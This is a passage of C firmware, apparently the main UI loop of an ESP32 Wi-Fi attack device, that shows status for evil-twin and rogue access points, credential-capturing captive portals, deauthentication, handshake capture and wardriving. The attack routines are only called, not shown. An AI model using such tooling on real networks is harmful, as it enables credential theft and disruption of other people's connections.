            boot_btn_prev_pressed = btn_pressed;
        }

        // Disco LED update — driven from main task to keep RMT calls single-threaded
        if (disco_led_needs_update) {
            disco_led_needs_update = false;
            led_set(disco_led_r, disco_led_g, disco_led_b);
        }

        // BT Lookout LED alert (runs even during go_dark/blackout)
        bool lookout_led_active = (!disco_mode_active && bt_lookout_tick(led_set));

        // Update NeoPixel LED color to reflect current mode (~2 Hz)
        if (!disco_mode_active && !lookout_led_active) {
            uint32_t now_ms = esp_timer_get_time() / 1000;
            if (now_ms - last_led_update_ms >= 100) {
                led_update_mode();
                last_led_update_ms = now_ms;
            }
        }

        // Thread-safe LVGL handling
        uint32_t sleep_ms = 10;
        if (xSemaphoreTake(lvgl_mutex, portMAX_DELAY) == pdTRUE) {
            // Apply touch indicator changes outside indev callback
            if (touch_dot && show_touch_dot) {
                if (touch_pressed_flag) {
                    lv_obj_clear_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
                    lv_obj_set_pos(touch_dot, (int)touch_x_flag - 5, (int)touch_y_flag - 5);
                    lv_obj_move_foreground(touch_dot);  // Ensure dot is always on top
                } else {
                    lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
                }
            }

            // Handle deferred back navigation safely
            if (nav_to_menu_flag) {
                nav_to_menu_flag = false;
                show_menu();
            }

            // Process Evil Twin UI events
            if (evil_twin_event_queue && evil_twin_status_list) {
                evil_twin_event_data_t evt;
                while (xQueueReceive(evil_twin_event_queue, &evt, 0) == pdTRUE) {
                    char msg[384];  // Increased to accommodate larger password field (256 bytes)
                    lv_color_t color = COLOR_MATERIAL_BLUE;
                    
                    switch (evt.event) {
                        case EVIL_TWIN_EVENT_DEAUTH_STARTED:
                            strcpy(msg, "Deauth started");
                            break;
                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
                            strcpy(msg, "Portal deployed");
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
                            strcpy(msg, "Client connected");
                            color = lv_color_make(100, 255, 100);  // Green
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
                            strcpy(msg, "Client disconnected");
                            color = lv_color_make(255, 200, 100);  // Orange
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_PROVIDED:
                            strcpy(msg, "Password provided");
                            color = lv_color_make(255, 255, 100);  // Yellow
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_FAILED:
                            strcpy(msg, "Password failed");
                            color = lv_color_make(255, 100, 100);  // Red
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_VERIFIED:
                            snprintf(msg, sizeof(msg), "Password verified, credentials saved:\n  SSID: %s\n  Pass: %s",
                                     evt.ssid, evt.password);
                            color = lv_color_make(100, 255, 100);  // Green
                            break;
                        default:
                            continue;
                    }
                    
                    evil_twin_add_status_message(msg, color);
                }
            }

            // Process Rogue AP UI events
            if (rogue_ap_event_queue && rogue_ap_status_list) {
                evil_twin_event_data_t evt;
                while (xQueueReceive(rogue_ap_event_queue, &evt, 0) == pdTRUE) {
                    char msg[384];
                    lv_color_t color = COLOR_MATERIAL_BLUE;
                    
                    switch (evt.event) {
                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
                            strcpy(msg, "Rogue AP active");
                            color = lv_color_make(100, 255, 100);
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
                            snprintf(msg, sizeof(msg), "Client connected: %s", evt.mac);
                            color = lv_color_make(100, 255, 100);
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
                            snprintf(msg, sizeof(msg), "Client disconnected: %s", evt.mac);
                            color = lv_color_make(255, 200, 100);
                            break;
                        case EVIL_TWIN_EVENT_PORTAL_OPENED:
                            strcpy(msg, "Client opened captive portal");
                            color = COLOR_MATERIAL_BLUE;
                            break;
                        case EVIL_TWIN_EVENT_FORM_DATA:
                            snprintf(msg, sizeof(msg), "Form data:\n%s", evt.password);
                            color = lv_color_make(255, 255, 100);
                            break;
                        default:
                            continue;
                    }
                    
                    rogue_ap_add_status_message(msg, color);
                }
            }

            if (evil_twin_log_ta && evil_twin_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(evil_twin_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(evil_twin_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(evil_twin_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(evil_twin_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(evil_twin_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(evil_twin_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (blackout_ui_active && (blackout_networks_label || blackout_status_label)) {
                blackout_stats_t stats;
                if (wifi_attacks_get_blackout_stats(&stats) == ESP_OK) {
                    if (blackout_networks_label) {
                        char buf[48];
                        snprintf(buf, sizeof(buf), "Networks attacked: %u", (unsigned)stats.networks_attacked);
                        lv_label_set_text(blackout_networks_label, buf);
                    }
                    if (blackout_status_label) {
                        const char *state = "Re-scanning";
                        if (!stats.active) {
                            state = "Stopped";
                        } else if (stats.status == BLACKOUT_STATUS_ATTACKING) {
                            state = "Attacking";
                        }
                        char buf[32];
                        snprintf(buf, sizeof(buf), "Status: %s", state);
                        lv_label_set_text(blackout_status_label, buf);
                    }
                }
            }

            if (snifferdog_ui_active && (snifferdog_kick_label || snifferdog_recent_label)) {
                uint32_t kicks;
                char recent_buf[48];
                portENTER_CRITICAL(&snifferdog_stats_spin);
                kicks = snifferdog_kick_count;
                strncpy(recent_buf, snifferdog_last_pair, sizeof(recent_buf));
                recent_buf[sizeof(recent_buf) - 1] = '\0';
                portEXIT_CRITICAL(&snifferdog_stats_spin);

                if (snifferdog_kick_label) {
                    char buf[48];
                    snprintf(buf, sizeof(buf), "Kicked out: %lu", (unsigned long)kicks);
                    lv_label_set_text(snifferdog_kick_label, buf);
                }
                if (snifferdog_recent_label) {
                    char buf[96];
                    snprintf(buf, sizeof(buf), "Last kick:\n%s", recent_buf);
                    lv_label_set_text(snifferdog_recent_label, buf);
                }
            }

            // Update sniffer UI if active
            if (sniffer_ui_active && !sniffer_observe_mode) {
                // Drain the log queue silently
                if (sniffer_log_queue) {
                    evil_log_msg_t msg;
                    while (xQueueReceive(sniffer_log_queue, &msg, 0) == pdTRUE) {
                        // Discard log messages
                    }
                }
                
                // Update channel label
                if (sniffer_channel_label) {
                    static uint8_t last_channel = 0;
                    uint8_t current_channel = wifi_sniffer_get_current_channel();
                    if (current_channel != last_channel) {
                        char ch_buf[16];
                        snprintf(ch_buf, sizeof(ch_buf), "Ch: %d", current_channel);
                        lv_label_set_text(sniffer_channel_label, ch_buf);
                        last_channel = current_channel;
                    }
                }
                
                // Refresh AP list periodically or when new data arrives
                static uint32_t last_ap_refresh = 0;
                uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
                if (sniffer_ui_needs_refresh || (now - last_ap_refresh > 3000)) {  // Refresh every 3s or on new data
                    sniffer_ui_needs_refresh = false;
                    last_ap_refresh = now;
                    sniffer_refresh_ap_list();
                }
            } else if (sniffer_ui_active && sniffer_observe_mode) {
                // Observation mode - refresh client list more frequently (every 2s)
                static uint32_t last_observe_refresh = 0;
                uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
                if (sniffer_ui_needs_refresh || (now - last_observe_refresh > 2000)) {
                    sniffer_ui_needs_refresh = false;
                    last_observe_refresh = now;
                    sniffer_refresh_observe_view();
                }
            } else if (sniffer_log_ta && sniffer_log_queue) {
                // Legacy textarea mode (if still used elsewhere)
                evil_log_msg_t msg;
                while (xQueueReceive(sniffer_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    const char *current_text = lv_textarea_get_text(sniffer_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(sniffer_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(sniffer_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(sniffer_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(sniffer_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (sae_overflow_log_ta && sae_overflow_log_queue) {
                evil_log_msg_t msg;
                // Process max 3 messages per UI cycle to avoid blocking
                int msg_count = 0;
                while (msg_count < 3 && xQueueReceive(sae_overflow_log_queue, &msg, 0) == pdTRUE) {
                    msg_count++;
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(sae_overflow_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(sae_overflow_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(sae_overflow_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(sae_overflow_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(sae_overflow_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (handshake_status_list && handshake_log_queue) {
                evil_log_msg_t msg;
                // Process max 3 messages per UI cycle to avoid blocking
                int msg_count = 0;
                while (msg_count < 3 && xQueueReceive(handshake_log_queue, &msg, 0) == pdTRUE) {
                    msg_count++;
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Filter messages to show only relevant status updates
                    // Look for: "handshake", "scanning", "finished", "captured", "attack", "EAPOL"
                    bool is_relevant = false;
                    char *lower_msg = lv_mem_alloc(line_len + 1);
                    if (lower_msg) {
                        for (size_t i = 0; i <= line_len; i++) {
                            lower_msg[i] = (msg.text[i] >= 'A' && msg.text[i] <= 'Z') ? 
                                           msg.text[i] + 32 : msg.text[i];
                        }
                        if (strstr(lower_msg, "handshake") || strstr(lower_msg, "scanning") ||
                            strstr(lower_msg, "finished") || strstr(lower_msg, "captured") ||
                            strstr(lower_msg, "attack") || strstr(lower_msg, "eapol") ||
                            strstr(lower_msg, "got") || strstr(lower_msg, "saved") ||
                            strstr(lower_msg, "target") || strstr(lower_msg, "complete")) {
                            is_relevant = true;
                        }
                        lv_mem_free(lower_msg);
                    }
                    
                    if (is_relevant) {
                        // Parse ESP-IDF log format: "I (12345) TAG: message" -> extract just "message"
                        char clean_msg[256];
                        const char *msg_start = msg.text;
                        
                        // Skip log level and timestamp: "I (12345) "
                        if ((msg.text[0] == 'I' || msg.text[0] == 'W' || msg.text[0] == 'E' || msg.text[0] == 'D') 
                            && msg.text[1] == ' ' && msg.text[2] == '(') {
                            // Find closing paren and space after timestamp
                            const char *paren_end = strchr(msg.text + 3, ')');
                            if (paren_end && paren_end[1] == ' ') {
                                msg_start = paren_end + 2;  // Skip ") "
                            }
                        }
                        
                        // Skip TAG: part - find first ": " and skip it
                        const char *colon = strstr(msg_start, ": ");
                        if (colon) {
                            msg_start = colon + 2;  // Skip ": "
                        }
                        
                        // Copy cleaned message
                        strncpy(clean_msg, msg_start, sizeof(clean_msg) - 1);
                        clean_msg[sizeof(clean_msg) - 1] = '\0';
                        
                        // Remove trailing newline if present
                        size_t clean_len = strlen(clean_msg);
                        if (clean_len > 0 && clean_msg[clean_len - 1] == '\n') {
                            clean_msg[clean_len - 1] = '\0';
                        }
                        
                        // Skip empty messages after cleanup
                        if (strlen(clean_msg) == 0) {
                            continue;
                        }
                        
                        // Add to status list - terminal style (black bg, green text)
                        lv_obj_t *item = lv_list_add_text(handshake_status_list, clean_msg);
                        lv_obj_set_style_bg_color(item, ui_bg_color(), 0);
                        
                        // Color based on content - brighter green for success
                        if (strstr(msg.text, "Got") || strstr(msg.text, "captured") || 
                            strstr(msg.text, "Saved") || strstr(msg.text, "Complete")) {
                            lv_obj_set_style_text_color(item, lv_color_make(0, 255, 0), 0);  // Bright green
                        } else {
                            lv_obj_set_style_text_color(item, COLOR_MATERIAL_GREEN, 0);  // Normal green
                        }
                        lv_obj_set_style_text_font(item, &lv_font_montserrat_12, 0);
                        
                        // Scroll to bottom
                        lv_obj_scroll_to_y(handshake_status_list, LV_COORD_MAX, LV_ANIM_ON);
                    }
                }
            }

            if (wardrive_log_ta && wardrive_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(wardrive_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(wardrive_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(wardrive_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(wardrive_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(wardrive_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(wardrive_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            if (karma_log_ta && karma_log_queue) {
                evil_log_msg_t msg;
                while (xQueueReceive(karma_log_queue, &msg, 0) == pdTRUE) {
                    size_t line_len = strlen(msg.text);
                    if (line_len == 0) {
                        continue;
                    }
                    
                    // Trim textarea if too long (keep last ~2000 chars to prevent rendering slowdown)
                    const char *current_text = lv_textarea_get_text(karma_log_ta);
                    if (current_text && strlen(current_text) > 2000) {
                        // Find newline after first 500 chars and keep everything after it
                        const char *trim_point = strchr(current_text + 500, '\n');
                        if (trim_point) {
                            // Copy trimmed text to temp buffer to avoid use-after-free
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(karma_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(karma_log_ta, msg.text);
                    if (msg.text[line_len - 1] != '\n') {
                        lv_textarea_add_text(karma_log_ta, "\n");
                    }
                    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            // Process Portal UI events
            if (portal_log_ta && portal_event_queue && portal_ui_active) {
                evil_twin_event_data_t evt;
                while (xQueueReceive(portal_event_queue, &evt, 0) == pdTRUE) {
                    char event_msg[320];  // Increased for captured data display
                    switch (evt.event) {
                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
                            snprintf(event_msg, sizeof(event_msg), "Client connected\n");
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
                            snprintf(event_msg, sizeof(event_msg), "Client disconnected\n");
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_PROVIDED:
                            // Show the actual captured data (stored in password field)
                            if (evt.password[0] != '\0') {
                                snprintf(event_msg, sizeof(event_msg), "%s\n", evt.password);
                            } else {
                                snprintf(event_msg, sizeof(event_msg), "Data captured\n");
                            }
                            break;
                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
                            snprintf(event_msg, sizeof(event_msg), "Portal deployed\n");
                            break;
                        case EVIL_TWIN_EVENT_DEAUTH_STARTED:
                            snprintf(event_msg, sizeof(event_msg), "Deauth started\n");
                            break;
                        default:
                            continue;  // Skip unknown events
                    }
                    
                    // Trim textarea if too long
                    const char *current_text = lv_textarea_get_text(portal_log_ta);
                    if (current_text && strlen(current_text) > 1500) {
                        const char *trim_point = strchr(current_text + 300, '\n');
                        if (trim_point) {
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(portal_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(portal_log_ta, event_msg);
                    lv_textarea_set_cursor_pos(portal_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            // Process Karma UI events (same format as Portal)
            if (karma_log_ta && karma_event_queue && karma_ui_active) {
                evil_twin_event_data_t evt;
                while (xQueueReceive(karma_event_queue, &evt, 0) == pdTRUE) {
                    char event_msg[320];
                    switch (evt.event) {
                        case EVIL_TWIN_EVENT_CLIENT_CONNECTED:
                            snprintf(event_msg, sizeof(event_msg), "Client connected\n");
                            break;
                        case EVIL_TWIN_EVENT_CLIENT_DISCONNECTED:
                            snprintf(event_msg, sizeof(event_msg), "Client disconnected\n");
                            break;
                        case EVIL_TWIN_EVENT_PASSWORD_PROVIDED:
                            // Show the actual captured data (stored in password field)
                            if (evt.password[0] != '\0') {
                                snprintf(event_msg, sizeof(event_msg), "%s\n", evt.password);
                            } else {
                                snprintf(event_msg, sizeof(event_msg), "Data captured\n");
                            }
                            break;
                        case EVIL_TWIN_EVENT_PORTAL_DEPLOYED:
                            snprintf(event_msg, sizeof(event_msg), "Portal deployed\n");
                            break;
                        case EVIL_TWIN_EVENT_DEAUTH_STARTED:
                            snprintf(event_msg, sizeof(event_msg), "Deauth started\n");
                            break;
                        default:
                            continue;  // Skip unknown events
                    }
                    
                    // Trim textarea if too long
                    const char *current_text = lv_textarea_get_text(karma_log_ta);
                    if (current_text && strlen(current_text) > 1500) {
                        const char *trim_point = strchr(current_text + 300, '\n');
                        if (trim_point) {
                            char *trimmed = lv_mem_alloc(strlen(trim_point));
                            if (trimmed) {
                                strcpy(trimmed, trim_point + 1);
                                lv_textarea_set_text(karma_log_ta, trimmed);
                                lv_mem_free(trimmed);
                            }
                        }
                    }
                    
                    lv_textarea_add_text(karma_log_ta, event_msg);
                    lv_textarea_set_cursor_pos(karma_log_ta, LV_TEXTAREA_CURSOR_LAST);
                }
            }

            // Handle deauth monitor scan completion - start monitoring after scan
            if (scan_done_ui_flag && deauth_monitor_scan_pending && deauth_monitor_ui_active) {
                scan_done_ui_flag = false;
                deauth_monitor_scan_pending = false;
                
                // Change status label color to gray after scan
                if (deauth_monitor_status_label && lv_obj_is_valid(deauth_monitor_status_label)) {
                    lv_obj_set_style_text_color(deauth_monitor_status_label, lv_color_make(176, 176, 176), 0);
                }
                
                // Start the actual monitoring
                deauth_monitor_start_monitoring();
            }
            // If scan finished, build results UI (but not during blackout/snifferdog/sae_overflow/handshake/wardrive/karma attack/deauth_monitor/portal or when handshaker is waiting for scan)
            else if (scan_done_ui_flag) {
                if (blackout_ui_active || snifferdog_ui_active || sae_overflow_ui_active || handshake_ui_active || wardrive_ui_active || karma_ui_active || deauth_monitor_ui_active || portal_ui_active || handshake_waiting_for_scan || g_handshaker_global_mode) {
                    // During attacks or while waiting for scan, just clear the flag without showing results
                    scan_done_ui_flag = false;
                } else {
                scan_done_ui_flag = false;

                if (function_page) { lv_obj_del(function_page); function_page = NULL; }
                reset_function_page_children();
                show_function_page("Scan Results");
                show_touch_dot = true;

                if (scan_list) { lv_obj_del(scan_list); scan_list = NULL; }
                scan_list = lv_list_create(function_page);
                if (!scan_list) {
                    xSemaphoreGive(lvgl_mutex);
                    vTaskDelay(pdMS_TO_TICKS(1));
                    continue;
                }
                lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
                lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
                lv_obj_set_style_bg_color(scan_list, ui_bg_color(), 0);
                lv_obj_set_style_text_color(scan_list, ui_text_color(), 0);
                // Remove separator lines between items
                lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
                lv_obj_set_style_border_color(scan_list, ui_bg_color(), LV_PART_ITEMS);

                uint16_t count = wifi_scanner_get_count();
                if (count == 0U) {
                    lv_list_add_text(scan_list, "No networks found");
                } else {
                    uint16_t display_count = (count > SCAN_RESULTS_MAX_DISPLAY) ? SCAN_RESULTS_MAX_DISPLAY : count;

                    wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * display_count);
                    if (!records) {
                        lv_list_add_text(scan_list, "Out of memory");
                    } else {
                        int got = wifi_scanner_get_results(records, display_count);
                        if (got < 0) {
                            lv_list_add_text(scan_list, "Failed to fetch results");
                        } else {
                            if (got > display_count) got = display_count;
                            for (int i = 0; i < got; i++) {
                                lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
                                if (!row) break;
                                lv_obj_set_width(row, lv_pct(100));
                                lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
                                lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
                                lv_obj_set_style_pad_gap(row, 10, 0);
                                lv_obj_set_height(row, LV_SIZE_CONTENT);
                                lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
                                lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);  // Lighter on press
                                lv_obj_set_style_radius(row, 8, 0);

                                lv_obj_t *cb = lv_checkbox_create(row);
                                if (!cb) break;
                                lv_checkbox_set_text(cb, "");
                                lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
                                // Material checkbox styling
                                lv_obj_set_style_bg_color(cb, lv_color_make(60, 60, 60), LV_PART_INDICATOR);  // Dark gray unchecked
                                lv_obj_set_style_bg_color(cb, ui_accent_color(), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Material Blue checked
                                lv_obj_set_style_border_color(cb, lv_color_make(100, 100, 100), LV_PART_INDICATOR);  // Gray border
                                lv_obj_set_style_border_width(cb, 2, LV_PART_INDICATOR);
                                lv_obj_set_style_radius(cb, 4, LV_PART_INDICATOR);  // Rounded
                                lv_obj_set_style_text_color(cb, ui_text_color(), 0);
                                lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);

                                lv_obj_t *ssid_lbl = lv_label_create(row);
                                if (!ssid_lbl) break;
                                char name_buf[128];
                                const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
                                if (records[i].ssid[0] != 0) {
                                    snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
                                             (const char *)records[i].ssid, band,
                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
                                } else {
                                    snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
                                             records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
                                             records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
                                }
                                lv_label_set_text(ssid_lbl, name_buf);
                                lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_DOT);
                                lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
                                lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);
                                lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
                                lv_obj_set_width(ssid_lbl, lv_pct(85));

                                if ((i & 7) == 7) {
                                    vTaskDelay(pdMS_TO_TICKS(1));
                                }
                            }
                        }

                        lv_mem_free(records);

                        if (count > SCAN_RESULTS_MAX_DISPLAY) {
                            char msg[48];
                            snprintf(msg, sizeof(msg), "... and %u more", count - SCAN_RESULTS_MAX_DISPLAY);
                            lv_list_add_text(scan_list, msg);
                        }
                    }
                }
                
                // Resize scan_list to leave space for Next button
                lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30 - 50);
                lv_obj_align(scan_list, LV_ALIGN_TOP_MID, 0, 30);
                
                // Add "Next" button at the bottom - Material Blue
                lv_obj_t *next_btn = lv_btn_create(function_page);
                lv_obj_set_size(next_btn, lv_pct(100), 45);
                lv_obj_align(next_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
                lv_obj_set_style_bg_color(next_btn, ui_accent_color(), LV_STATE_DEFAULT);  // Material Blue
                lv_obj_set_style_bg_color(next_btn, lv_color_lighten(ui_accent_color(), 30), LV_STATE_PRESSED);
                lv_obj_set_style_border_width(next_btn, 0, 0);
                lv_obj_set_style_radius(next_btn, 8, 0);
                lv_obj_set_style_shadow_width(next_btn, 6, 0);
                lv_obj_set_style_shadow_color(next_btn, lv_color_make(0, 0, 0), 0);
                lv_obj_set_style_shadow_opa(next_btn, LV_OPA_30, 0);
                lv_obj_t *next_lbl = lv_label_create(next_btn);
                lv_label_set_text(next_lbl, "Next " LV_SYMBOL_RIGHT);
                lv_obj_set_style_text_color(next_lbl, ui_text_color(), 0);
                lv_obj_set_style_text_font(next_lbl, &lv_font_montserrat_16, 0);
                lv_obj_center(next_lbl);
                lv_obj_add_event_cb(next_btn, wifi_scan_next_btn_cb, LV_EVENT_CLICKED, NULL);
                
                }  // End of else block for !blackout_ui_active
            }
            // Update FPS label if on Deauther page
            static uint32_t last_flush_cnt = 0;
            static uint64_t last_us = 0;
            if (deauth_fps_label && function_page) {
                uint64_t now = esp_timer_get_time();
                if (last_us == 0) { last_us = now; last_flush_cnt = lvgl_flush_counter; }
                if (now - last_us >= 1000000) {
                    uint32_t frames = lvgl_flush_counter - last_flush_cnt;
                    char fps_buf[24];
                    snprintf(fps_buf, sizeof(fps_buf), "%u FPS", (unsigned)frames);
                    lv_label_set_text(deauth_fps_label, fps_buf);
                    last_flush_cnt = lvgl_flush_counter;
                    last_us = now;
                }
            }

            // Handle stop/resume flags and update button label
            if (deauth_stop_flag) {
                deauth_stop_flag = false;
                wifi_attacks_stop_deauth();
                if (deauth_pause_btn) {
                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
                    if (label) lv_label_set_text(label, "Resume");
                }
            }
            if (deauth_resume_flag) {
                deauth_resume_flag = false;
                wifi_attacks_start_deauth();
                if (deauth_pause_btn) {
                    lv_obj_t *label = lv_obj_get_child(deauth_pause_btn, 0);
                    if (label) lv_label_set_text(label, "Pause");
                }
            }
            
            // Handle periodic deauth rescan
            if (deauth_rescan_pending && !deauth_rescan_active) {
                deauth_rescan_pending = false;
                
                // Check if deauth UI is still valid before starting rescan
                bool can_rescan = (deauth_list != NULL && function_page != NULL &&
                                   lv_obj_is_valid(deauth_list) && lv_obj_is_valid(function_page));
                
                if (can_rescan) {
                    deauth_rescan_active = true;
                    
                    // Update UI to show rescanning message
                    if (deauth_prompt_label && lv_obj_is_valid(deauth_prompt_label)) {
                        lv_label_set_text(deauth_prompt_label, "Rescanning to double check channels...");
                    }
                    
                    // Clear the network list temporarily
                    lv_obj_clean(deauth_list);
                    lv_obj_t *rescan_msg = lv_label_create(deauth_list);
                    lv_label_set_text(rescan_msg, "Rescanning...");
                    lv_obj_set_style_text_color(rescan_msg, ui_text_color(), 0);
                    lv_obj_set_style_text_font(rescan_msg, &lv_font_montserrat_14, 0);
                    
                    // Pause deauth briefly
                    wifi_attacks_stop_deauth();
                    
                    // Start a new scan (will trigger deauth_rescan_done_flag when complete)
                    wifi_scanner_start_scan();
                } else {
                    // UI no longer valid, just stop the timer
                    ESP_LOGW(TAG, "Deauth rescan skipped - UI no longer valid");
                    deauth_rescan_timer_stop();
                }
            }
            
            // Handle deauth rescan completion (using dedicated flag)
            if (deauth_rescan_done_flag && deauth_rescan_active) {
                deauth_rescan_done_flag = false;
                
                // Validate that deauth UI is still valid before manipulating
                bool ui_valid = (deauth_list != NULL && function_page != NULL && 
                                 lv_obj_is_valid(deauth_list) && lv_obj_is_valid(function_page));
                
                // Get new scan results and check for channel changes
                uint16_t new_count = wifi_scanner_get_count();
                wifi_ap_record_t *new_records = NULL;
                bool channels_updated = false;
                
                if (new_count > 0) {
                    new_records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * new_count);
                    if (new_records) {
                        wifi_scanner_get_results(new_records, new_count);
                        
                        // Check each target for channel changes
                        for (int t = 0; t < deauth_target_count; t++) {
                            for (int n = 0; n < (int)new_count; n++) {
                                if (memcmp(deauth_target_bssids[t], new_records[n].bssid, 6) == 0) {
                                    if (deauth_target_channels[t] != new_records[n].primary) {
                                        ESP_LOGI(TAG, "Channel change detected: %02X:%02X:%02X:%02X:%02X:%02X Ch%d -> Ch%d",
                                                 deauth_target_bssids[t][0], deauth_target_bssids[t][1],
                                                 deauth_target_bssids[t][2], deauth_target_bssids[t][3],
                                                 deauth_target_bssids[t][4], deauth_target_bssids[t][5],
                                                 deauth_target_channels[t], new_records[n].primary);
                                        deauth_target_channels[t] = new_records[n].primary;
